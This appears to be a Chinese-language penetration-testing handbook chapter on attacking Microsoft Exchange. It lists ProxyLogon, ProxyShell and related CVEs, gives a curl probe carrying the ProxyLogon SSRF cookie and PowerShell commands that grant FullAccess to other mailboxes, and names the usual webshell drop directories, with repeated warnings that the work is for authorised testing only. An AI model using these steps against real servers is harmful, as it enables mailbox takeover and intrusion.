# 第15章 Exchange 权限利用分析

## 识别 Exchange

- `/owa/`、`/ecp/`、`/autodiscover/` 是常见入口。
- 通过响应头 `X-FEServer`、`X-Calculatedbetarget` 和后端版本号定位服务器。
- 登录页面源码中的内部版本号可与微软版本表对照。

## 常见漏洞

- CVE-2020-16875：Exchange 远程代码执行。
- CVE-2020-0688：ViewState 反序列化。
- ProxyLogon：CVE-2021-26855 + CVE-2021-27065。
- ProxyShell：CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207。
- ProxyNotShell：CVE-2022-41040 + CVE-2022-41082。
- 使用前确认版本、补丁和授权；不要直接对生产邮箱执行破坏性操作。

## 邮箱权限

```powershell
Get-Mailbox -Identity user@domain.com | Format-List *
Add-MailboxPermission -Identity target@domain.com -User current@domain.com -AccessRights FullAccess -InheritanceType All
```

## Webshell 注意

- 仅限授权测试；写入前确认目录、Web 应用解析能力和清理方案。
- 不同 Exchange 版本、IIS 配置和防护策略会影响路径与解析。
- 不要在报告中保留可用的 Webshell 密码或真实邮箱凭据。

## 收尾

- 清理测试邮箱权限、测试文件、测试账号和计划任务。
- 将实际修改项列入回滚清单。
## 命令速查

### 发现与版本

```bash
curl -I https://<EXCHANGE>/owa/
curl -I https://<EXCHANGE>/ecp/<FILE>.js -H 'Cookie: X-BEResource=localhost~1'
ruler.exe -k --domain <DOMAIN> autodiscover
```

### 邮箱权限

```powershell
Get-Mailbox -Identity <USER>@<DOMAIN> | Format-List *
Get-Mailbox -ResultSize unlimited -Filter {(RecipientTypeDetails -eq 'UserMailbox')}
Add-MailboxPermission -Identity <TARGET>@<DOMAIN> -User <USER>@<DOMAIN> -AccessRights FullAccess -InheritanceType All
```

### 漏洞检索

```text
CVE-2020-16875  Exchange RCE
CVE-2020-0688   ViewState 反序列化
ProxyLogon      CVE-2021-26855 + CVE-2021-27065
ProxyShell      CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207
ProxyNotShell   CVE-2022-41040 + CVE-2022-41082
```

### Webshell 安全提示

- 仅限授权测试；写入前确认 Exchange 版本、IIS 解析路径、WAF 和清理方案。
- 常用目录：`C:\inetpub\wwwroot\aspnet_client\`、`FrontEnd\HttpProxy\owa\auth\`。
- 测试结束立即删除 Webshell、测试邮箱权限和测试文件，并记录回滚项。
- 报告中不要保留真实 Webshell 密码、邮箱凭据或可复用证书。
